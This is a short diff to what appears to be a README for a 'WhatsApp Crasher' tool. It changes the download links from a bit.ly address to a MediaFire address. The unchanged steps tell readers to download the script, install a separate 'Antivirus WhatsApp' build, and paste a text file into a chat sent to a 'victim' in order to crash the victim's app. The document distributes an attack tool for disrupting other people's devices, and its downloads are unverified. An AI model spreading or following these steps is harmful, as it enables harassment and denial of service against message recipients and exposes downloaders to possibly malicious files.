@@ -3,7 +3,7 @@
 
 
 
-<a href="https://bit.ly/3ybf6Hd">WhatsApp Crasher Download Here</a>
+<a href="https://www.mediafire.com/download/uga6en3n3dwya8e">WhatsApp Crasher Download Here</a>
 
 
 1.Step:
@@ -12,7 +12,7 @@ Download Script Link 👇
 
 2.Step:
 Antivirus WhatsApp Link 👇
-       https://bit.ly/3ybf6Hd
+       https://www.mediafire.com/download/uga6en3n3dwya8e
 
 Open WhatsApp Copy All txt File And Send Victim Use Only This AntiVirus WhatsApp
 
